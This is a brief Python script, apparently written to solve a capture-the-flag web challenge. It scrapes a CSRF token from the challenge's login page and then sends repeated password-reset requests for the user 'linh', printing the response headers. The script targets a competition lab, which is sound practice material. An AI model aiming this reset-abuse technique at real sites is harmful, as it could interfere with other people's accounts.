import requests
import re

k = requests.Session()
r = k.get('http://chal.pctf.competitivecyber.club:5000/login.php')
token = re.search('<input type="hidden" name="token" value="(.*)"', r.text).group(1)
for i in range(0,3):
  data = {"uid":"linh","token": token, "submit":1}
  r = k.post('http://chal.pctf.competitivecyber.club:5000/modules/reset.inc.php', data=data, allow_redirects=False)
  print(r.headers)

# r = k.get('http://chal.pctf.competitivecyber.club:5000/login.php')
# token = re.search('<input type="hidden" name="token" value="(.*)"', r.text).group(1)

